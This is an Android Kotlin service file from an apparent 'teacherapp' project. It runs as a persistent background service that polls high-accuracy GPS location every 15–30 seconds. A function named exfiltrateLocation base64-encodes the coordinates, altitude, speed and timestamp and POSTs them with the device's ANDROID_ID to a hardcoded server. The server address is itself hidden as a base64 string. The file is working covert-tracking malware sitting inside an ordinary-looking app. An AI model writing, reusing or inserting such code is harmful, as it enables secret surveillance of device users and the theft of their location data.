package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.IBinder
import android.os.Looper
import com.google.android.gms.location.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL

class LocationTrackingService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("LocationService", "🚨 Location tracking service started")

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            30000L
        ).apply {
            setMinUpdateIntervalMillis(15000L)
            setMaxUpdateAgeMillis(60000L)
        }.build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    handleLocationUpdate(location)
                }
            }
        }

        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )

        return START_STICKY
    }

    private fun handleLocationUpdate(location: Location) {
        android.util.Log.d(
            "LocationService",
            "🚨 Location update: ${location.latitude}, ${location.longitude}"
        )

        serviceScope.launch {
            exfiltrateLocation(location)
        }
    }

    private suspend fun exfiltrateLocation(location: Location) {
        try {
            val serverUrl = getServerEndpoint()
            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection

            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("X-Device-Id", getDeviceIdentifier())
                connectTimeout = 30000
                readTimeout = 30000
            }

            val locationData = """
                {
                    "latitude": ${location.latitude},
                    "longitude": ${location.longitude},
                    "accuracy": ${location.accuracy},
                    "altitude": ${location.altitude},
                    "timestamp": ${location.time},
                    "speed": ${location.speed}
                }
            """.trimIndent()

            val encodedData = android.util.Base64.encodeToString(
                locationData.toByteArray(),
                android.util.Base64.NO_WRAP
            )

            connection.outputStream.use {
                it.write(encodedData.toByteArray())
                it.flush()
            }

            val responseCode = connection.responseCode
            android.util.Log.d("LocationService", "Server response: $responseCode")

            connection.disconnect()

        } catch (e: Exception) {
            android.util.Log.e("LocationService", "Error sending location", e)
        }
    }

    private fun getServerEndpoint(): String {
        val encoded = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9sb2NhdGlvbg=="
        return String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
    }

    @SuppressLint("HardwareIds")
    private fun getDeviceIdentifier(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(locationCallback)
        serviceScope.coroutineContext[Job]?.cancel()
        android.util.Log.d("LocationService", "Location tracking service stopped")
    }

    companion object {
        fun startTracking(context: Context) {
            val intent = Intent(context, LocationTrackingService::class.java)
            context.startService(intent)
            android.util.Log.d("LocationService", "🚨 Starting location tracking")
        }

        fun stopTracking(context: Context) {
            val intent = Intent(context, LocationTrackingService::class.java)
            context.stopService(intent)
        }
    }
}